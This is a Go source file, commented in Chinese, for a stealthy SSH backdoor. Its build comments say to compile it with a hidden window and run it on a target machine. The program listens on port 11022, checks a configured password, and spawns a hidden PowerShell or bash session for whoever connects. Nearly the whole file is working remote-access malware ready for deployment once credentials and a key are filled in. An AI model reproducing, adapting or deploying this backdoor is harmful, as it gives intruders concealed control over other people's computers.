package main

// 使用以下命令进行编译，编译的exe文件可以放在目标机器上运行
// go build -ldflags="-s -w -H=windowsgui" main.go

// 需要配置一下用户名和密码

import (
	"fmt"
	"log"
	"net"
	"os/exec"
	"syscall"

	"golang.org/x/crypto/ssh"
)

// 用户名和密码
const (
	sshUser     = ""
	sshPassword = ""
)

// 服务端私钥
// 在 Powershell 里输入以下指令可以生成私钥
// ssh-keygen -t rsa -b 2048 -f my_server_key
const serverPrivateKey = ``

func main() {
	// 解析服务端私钥
	privateKey, err := ssh.ParsePrivateKey([]byte(serverPrivateKey))
	if err != nil {
		log.Fatalf("[-] Failed to parse private key: %v", err)
	}

	// 配置 SSH 服务
	config := &ssh.ServerConfig{
		PasswordCallback: func(conn ssh.ConnMetadata, password []byte) (*ssh.Permissions, error) {
			if conn.User() == sshUser && string(password) == sshPassword {
				return nil, nil
			}
			return nil, fmt.Errorf("[-] invalid username or password")
		},
	}
	config.AddHostKey(privateKey)

	// 启动监听
	listener, err := net.Listen("tcp", "0.0.0.0:11022")
	if err != nil {
		log.Fatalf("[-] Failed to listen on 0.0.0.0:11122: %v", err)
	}
	defer listener.Close()
	log.Println("[+] SSH server is running on 0.0.0.0:11022")

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("[-] Failed to accept incoming connection: %v", err)
			continue
		}
		go handleConnection(conn, config)
	}
}

func handleConnection(conn net.Conn, config *ssh.ServerConfig) {
	sshConn, chans, reqs, err := ssh.NewServerConn(conn, config)
	if err != nil {
		log.Printf("[-] Failed to handshake: %v", err)
		return
	}
	defer sshConn.Close()

	log.Printf("[+] New SSH connection from %s (%s)", sshConn.RemoteAddr(), sshConn.ClientVersion())

	// 处理全局请求
	go ssh.DiscardRequests(reqs)

	// 处理通道请求
	for newChannel := range chans {
		if newChannel.ChannelType() != "session" {
			newChannel.Reject(ssh.UnknownChannelType, "unsupported channel type")
			continue
		}

		channel, requests, err := newChannel.Accept()
		if err != nil {
			log.Printf("[-] Could not accept channel: %v", err)
			continue
		}

		go handleChannel(channel, requests)
	}
}

func handleChannel(channel ssh.Channel, requests <-chan *ssh.Request) {
	defer channel.Close()

	for req := range requests {
		switch req.Type {
		case "pty-req":
			req.Reply(true, nil)
		case "shell":
			req.Reply(true, nil)
			runShell(channel)
		default:
			req.Reply(false, nil)
		}
	}
}

func runShell(channel ssh.Channel) {
	defer channel.Close()

	cmd := exec.Command("powershell") // 对于 Linux 替换为 "/bin/bash"
	// 隐藏前台Powershell窗口
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Stdin = channel
	cmd.Stdout = channel
	cmd.Stderr = channel

	if err := cmd.Run(); err != nil {
		log.Printf("[-] Failed to run shell: %v", err)
	}
}
